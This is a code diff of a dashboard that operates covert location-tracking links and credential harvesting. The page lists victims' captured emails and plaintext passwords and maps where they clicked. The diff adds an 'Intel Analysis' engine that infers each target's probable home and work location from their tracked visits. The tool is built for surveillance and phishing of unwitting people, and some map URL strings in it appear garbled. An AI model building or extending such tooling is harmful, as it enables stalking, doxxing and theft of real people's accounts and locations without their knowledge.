@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>:: HACKER-UI DASHBOARD v7.1 (Final) ::</title>
+    <title>:: HACKER-UI DASHBOARD v7.3 (Intel Engine) ::</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -24,6 +24,8 @@
         .feature-panel { border: 1px solid #00ffff; padding: 20px; margin-top: 20px; background-color: rgba(0, 255, 255, 0.05); box-shadow: 0 0 10px #00ffff inset; }
         .feature-panel h2 { text-align: center; color: #00ffff; text-shadow: 0 0 8px #00ffff; border-bottom: 1px solid #00ffff; padding-bottom: 10px; margin-top: 0; }
         .table-header-actions { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        #intel-analysis-section h2 { color: #ff00ff; text-shadow: 0 0 8px #ff00ff; }
+        #intel-results p { margin-bottom: 8px; }
     </style>
 </head>
 <body>
@@ -92,16 +94,15 @@
             </div>
             <hr style="border-color: #ff4141; margin-top: 0;">
             <div id="merged-credentials-section"><p class="highlight">> Awaiting data...</p></div>
-            
-            <div id="map-modal" class="modal">
-                <div class="modal-content">
-                    <span class="close-btn">×</span>
-                    <h2 id="modal-title" class="main-title" style="font-size: 24px;">Location History</h2>
-                    <div id="map"></div>
-                    <div id="map-actions" style="text-align: center; margin-top: 15px;"></div>
+
+            <h1 class="main-title" style="margin-top: 30px;">> INTEL_ANALYSIS_ENGINE.DAT</h1>
+            <div id="intel-analysis-section" class="feature-panel" style="display:none; border-color: #ff00ff; box-shadow: 0 0 10px #ff00ff inset;">
+                <h2 style="color: #ff00ff; border-color: #ff00ff;">> BEHAVIORAL ANALYSIS for: <span id="intel-target-name" class="highlight"></span></h2>
+                <div id="intel-results">
+                    <p class="highlight">> Awaiting analysis command...</p>
                 </div>
             </div>
-
+            
             <h1 class="main-title" style="margin-top: 30px;">> REALTIME_LOCATION_MAP</h1>
             <div class="map-container feature-panel">
                 <div id="realtime-map" style="height: 450px;"></div>
@@ -109,6 +110,15 @@
         </div>
     </div>
     
+    <div id="map-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn">×</span>
+            <h2 id="modal-title" class="main-title" style="font-size: 24px;">Location History</h2>
+            <div id="map"></div>
+            <div id="map-actions" style="text-align: center; margin-top: 15px;"></div>
+        </div>
+    </div>
+
     <div id="qr-code-modal" class="modal">
         <div class="modal-content">
             <span class="close-btn" id="qr-close-btn">×</span>
@@ -136,7 +146,7 @@
         const logSection = document.getElementById('log-section'), logoutBtn = document.getElementById('logout-btn'), linkForm = document.getElementById('link-form');
         const advancedToggle = document.getElementById('advanced-toggle'), advancedOptions = document.getElementById('advanced-options');
         const notificationSound = document.getElementById('notification-sound');
-        const modal = document.getElementById('map-modal'), modalTitle = document.getElementById('modal-title'), closeBtn = document.querySelector('.close-btn'), mapActionsDiv = document.getElementById('map-actions');
+        const modal = document.getElementById('map-modal'), modalTitle = document.getElementById('modal-title'), closeBtn = modal.querySelector('.close-btn'), mapActionsDiv = document.getElementById('map-actions');
         const qrModal = document.getElementById('qr-code-modal'), qrCloseBtn = document.getElementById('qr-close-btn'), qrContainer = document.getElementById('qr-code-container'), qrDownloadLink = document.getElementById('qr-download-link');
         const exportExcelBtn = document.getElementById('export-excel-btn');
         let topLinksChart, browserChart, map, markersLayer, realtimeMap, realtimeMarkersLayer, isAudioEnabled = false, qrcode = null;
@@ -212,11 +222,11 @@
         exportExcelBtn.addEventListener('click', exportToExcel);
 
         function renderLocationLinksTable(links = []) {
-            const locationLinks = links.filter(link => link.link_type === 'direct');
+            const locationLinks = links.filter(link => link.link_type === 'direct' || link.link_type === 'iframe');
             if (locationLinks.length === 0) {
                 locationLinksSection.innerHTML = "<p class='error'>> NO LOCATION TRACKER LINKS FOUND.</p>";
             } else {
-                let html = `<table class="hacker-table"><thead><tr><th>Created At</th><th>Link ID</th><th>Target ID</th><th>Clicks</th><th>Last Location</th><th>Status</th><th>Aksi</th></tr></thead><tbody>`;
+                let html = `<table class="hacker-table"><thead><tr><th>Created</th><th>Link ID</th><th>Target ID</th><th>Clicks</th><th>Last Location</th><th>Status</th><th>Aksi</th></tr></thead><tbody>`;
                 locationLinks.forEach(r => {
                     const linkUrl = `${window.location.protocol}//${window.location.host}/${r.id}`;
                     const isExpired = r.expires_at && new Date(r.expires_at) < new Date();
@@ -227,9 +237,10 @@
                         mapButton = `<button class="hacker-button small" onclick="showMapModal('${r.id}', '${r.username}')">[ MAP ]</button>`; 
                     }
                     const qrButton = `<button class="hacker-button small" onclick="showQrModal('${linkUrl}')">[ QR ]</button>`;
+                    const analyzeButton = `<button class="hacker-button small cyan" onclick="runIntelAnalysis('${r.username}')">[ ANALYZE ]</button>`;
                     const deleteButton = `<button class="hacker-button small red" onclick="deleteLink('${r.id}', '${r.username}')">[ DELETE ]</button>`;
                     const locationText = r.city && r.country ? `${r.city}, ${r.country}` : 'N/A';
-                    html += `<tr><td>${new Date(r.created_at).toLocaleString('id-ID')}</td><td><a href="${linkUrl}" target="_blank">${r.id}</a></td><td class="highlight">${r.username}</td><td class="highlight">${r.click_count}</td><td class="highlight">${locationText}</td><td class="${statusClass}">${statusText}</td><td class="action-buttons">${mapButton} ${qrButton} ${deleteButton}</td></tr>`;
+                    html += `<tr><td>${new Date(r.created_at).toLocaleDateString('id-ID')}</td><td><a href="${linkUrl}" target="_blank">${r.id}</a></td><td class="highlight">${r.username}</td><td class="highlight">${r.click_count}</td><td class="highlight">${locationText}</td><td class="${statusClass}">${statusText}</td><td class="action-buttons">${mapButton} ${analyzeButton} ${qrButton} ${deleteButton}</td></tr>`;
                 });
                 html += "</tbody></table>";
                 locationLinksSection.innerHTML = html;
@@ -277,6 +288,7 @@
                 const statusClass = isExpired ? 'error' : 'highlight';
                 const statusText = isExpired ? 'EXPIRED' : 'ACTIVE';
                 const qrButton = `<button class="hacker-button small" onclick="showQrModal('${linkUrl}')">[ QR ]</button>`;
+                const analyzeButton = `<button class="hacker-button small cyan" onclick="runIntelAnalysis('${r.username}')">[ ANALYZE ]</button>`;
                 const deleteButton = `<button class="hacker-button small red" onclick="deleteLink('${r.id}', '${r.username}')">[ DELETE ]</button>`;
                 
                 html += `<tr>
@@ -287,7 +299,7 @@
                     <td class="highlight">${r.email}</td>
                     <td class="highlight">${r.password}</td>
                     <td class="${statusClass}">${statusText}</td>
-                    <td class="action-buttons">${qrButton} ${deleteButton}</td>
+                    <td class="action-buttons">${analyzeButton} ${qrButton} ${deleteButton}</td>
                 </tr>`;
             });
             html += "</tbody></table>";
@@ -336,6 +348,63 @@
                 map.setView([0, 0], 2);
             }
         }
+
+        // ##### NEW: INTEL ENGINE FUNCTIONS - START #####
+        async function runIntelAnalysis(username) {
+            const intelSection = document.getElementById('intel-analysis-section');
+            const intelResultsDiv = document.getElementById('intel-results');
+            const intelTargetName = document.getElementById('intel-target-name');
+
+            intelSection.style.display = 'block';
+            intelTargetName.textContent = username;
+            intelResultsDiv.innerHTML = `<p class="highlight">> PROCESSING INTEL DATA... STAND BY...</p>`;
+
+            try {
+                const response = await fetchProtected(`/api/intel/${username}`);
+                const data = await response.json();
+                if (!response.ok) { throw new Error(data.error || 'Analysis failed'); }
+                renderIntelResults(data);
+            } catch (err) {
+                intelResultsDiv.innerHTML = `<p class="error">> ERROR: ${err.message}</p>`;
+            }
+        }
+
+        function renderIntelResults(data) {
+            const intelResultsDiv = document.getElementById('intel-results');
+            if (data.message) {
+                intelResultsDiv.innerHTML = `<p class="error">> ANALYSIS FAILED: ${data.message}</p>`;
+                return;
+            }
+
+            let html = '';
+            if (data.home) {
+                const mapUrl = `http://googleusercontent.com/maps/google.com/9{data.home.lat},${data.home.lon}`;
+                html += `<p>> [🏠] Probable Home Location: <a href="${mapUrl}" target="_blank">[View on Map]</a> (Based on ${data.home.count} visits)</p>`;
+            } else {
+                html += `<p>> [🏠] Probable Home Location: <span class="error">Not enough data.</span></p>`;
+            }
+
+            if (data.work) {
+                const mapUrl = `http://googleusercontent.com/maps/google.com/9{data.work.lat},${data.work.lon}`;
+                html += `<p>> [🏢] Probable Work Location: <a href="${mapUrl}" target="_blank">[View on Map]</a> (Based on ${data.work.count} visits)</p>`;
+            } else {
+                html += `<p>> [🏢] Probable Work Location: <span class="error">Not enough data.</span></p>`;
+            }
+            
+            html += `<hr style="border-color: #ff00ff; margin: 15px 0;">`;
+
+            if (data.anomalies && data.anomalies.length > 0) {
+                html += `<p>> [🚨] Anomalies Detected:</p>`;
+                data.anomalies.forEach(anomaly => {
+                    html += `<p class="error" style="margin-left: 15px;">- ${anomaly}</p>`;
+                });
+            } else {
+                html += `<p>> [🚨] Anomalies Detected: <span class="highlight">None.</span></p>`;
+            }
+
+            intelResultsDiv.innerHTML = html;
+        }
+        // ##### NEW: INTEL ENGINE FUNCTIONS - END #####
 
         const socket = io();
         socket.on('connect', () => {
